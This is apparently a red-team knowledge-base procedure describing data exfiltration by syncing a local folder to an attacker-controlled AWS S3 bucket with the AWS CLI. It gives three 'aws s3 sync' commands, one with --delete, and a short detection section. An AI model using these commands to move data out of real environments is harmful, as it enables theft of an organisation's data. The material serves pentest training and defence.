---
id: 66548cd2-d318-4a10-8bd0-ece2625f792f
name: AWS-Sync-Folder-with-S3-Bucket
type: procedure
verified: true
submitted: true
created_at: '2020-07-31T04:25:33.802998+00:00'
updated_at: '2023-05-25T20:07:56.422583+00:00'
tactics:
  - '[[Exfiltration]]'
techniques:
  - '[[Transfer Data to Cloud Account]]'
sub_techniques: []
tags:
  - AWS
  - Cloud
  - Exfiltration
commands:
  - '[[commands/aws-s3-sync-local-folder]]'
  - '[[commands/aws-s3-sync-specify-region]]'
  - '[[commands/aws-s3-sync-with-delete-removal]]'
platforms:
  - Cloud
tools:
  - '[[tools/AWS-CLI]]'
validated: true
---

# AWS-Sync-Folder-with-S3-Bucket

## Summary

This procedure synchronizes the contents of a local folder with an AWS S3 bucket using the AWS CLI. It uploads new or updated files from the local folder to the bucket based on timestamps or presence, making it useful for data exfiltration during cloud-based assessments or for staging files in S3 for further access in red team operations.

## Description

The AWS S3 sync command efficiently transfers files between a local directory and an S3 bucket, only copying files that have changed or are missing in the destination. This technique is particularly valuable in offensive security for exfiltrating data to a controlled S3 bucket without transferring unchanged files, reducing detection risk. It requires valid AWS credentials with S3 write permissions and can be configured to specify regions or delete extraneous files in the bucket. In a pentest scenario, this could be used post-compromise to move sensitive data out of the target environment to an attacker-controlled storage location.

## Requirements

1. AWS CLI installed and configured with credentials that have S3 bucket write access (e.g., via `aws configure`).
2. Network access to the target AWS region and S3 endpoint.
3. Local folder containing files to sync, and the S3 bucket name.
4. Optional: Specific AWS region if not using the default.

## Defense

Defensive measures and detection strategies:

- Monitor S3 access logs for unusual upload patterns or sync operations from unexpected IP addresses.
- Implement AWS IAM policies to restrict S3 bucket access and require MFA for sensitive operations.
- Use AWS CloudTrail to log API calls like `s3:PutObject` and alert on high-volume transfers.
- Enable S3 bucket versioning and logging to track unauthorized modifications.

## Objectives

1. Upload new or modified files from a local folder to an S3 bucket for exfiltration or staging.
2. Ensure synchronization handles timestamps to avoid redundant transfers.
3. Optionally clean up the bucket by deleting files not present in the source folder.
4. Verify successful sync without errors in authentication or permissions.

## Instructions

### Step 1: Sync Local Folder to S3 Bucket

**Context**: Begin by syncing a specified local folder to the S3 bucket. This step uploads files that are new or have newer timestamps in the local folder, providing a basic synchronization without regional specification.

**Command** ([[commands/aws-s3-sync-local-folder]]):
```bash
aws s3 sync $FOLDER s3://$AWS_S3_BUCKET
```

> This command compares the local folder ($FOLDER) with the S3 bucket ($AWS_S3_BUCKET) and uploads only necessary files. It uses the default AWS region configured in your CLI profile. Expected output includes progress indicators like "upload: folder/file.txt to s3://bucket/folder/file.txt" for each transferred file, confirming successful synchronization.

### Step 2: Sync Current Directory with Region Specification

**Context**: If the bucket is in a specific region, explicitly specify it to ensure the command targets the correct location. This is useful when operating in multi-region environments to avoid errors.

**Command** ([[commands/aws-s3-sync-specify-region]]):
```bash
aws s3 sync . s3://$AWS_S3_BUCKET --region $AWS_REGION
```

> Here, "." syncs the current directory. The --region flag ($AWS_REGION, e.g., us-east-1) directs the operation. Expected output shows uploads similar to the previous step, with no region-related errors, verifying the sync completes in the intended location.

### Step 3: Sync with Deletion of Missing Files

**Context**: For a complete mirror, add the --delete flag to remove files from the S3 bucket that no longer exist in the local source. This optional step ensures the bucket reflects the exact state of the local folder, useful for cleanup in exfiltration scenarios.

**Command** ([[commands/aws-s3-sync-with-delete-removal]]):
```bash
aws s3 sync . s3://$AWS_S3_BUCKET --region $AWS_REGION --delete
```

> The --delete flag ($AWS_S3_BUCKET and $AWS_REGION as before) removes extraneous files. Expected output includes both upload and delete actions, such as "delete: s3://bucket/oldfile.txt", indicating a full synchronization has occurred.
